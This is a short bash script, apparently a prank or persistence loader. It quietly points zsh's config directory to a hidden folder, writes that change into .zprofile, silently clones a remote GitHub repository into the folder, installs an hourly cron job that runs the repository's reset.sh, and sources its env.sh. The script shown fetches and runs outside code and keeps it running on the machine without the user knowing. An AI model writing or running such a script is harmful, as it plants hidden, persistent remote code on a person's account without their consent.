#!/usr/bin/env bash

#new zsh config dir
export ZDOTDIR="$HOME/.config/.good_luck"
mkdir -p $ZDOTDIR &> /dev/null;

echo "export ZDOTDIR=$HOME/.config/.good_luck" >> $HOME/.zprofile
#adding scripts to zdotdir
git clone https://github.com/filz0r/oh_no $ZDOTDIR &> /dev/null;
cat $HOME/.bashrc >> $ZDOTDIR/.bashrc
cat $HOME/.zshrc >> $ZDOTDIR/.zshrc

# setting cronjob for reseting
CRON_ENTRY="15 * * * * $ZDOTDIR/reset.sh"
(crontab -l ; echo "$CRON_ENTRY") | crontab -
    
source $ZDOTDIR/env.sh
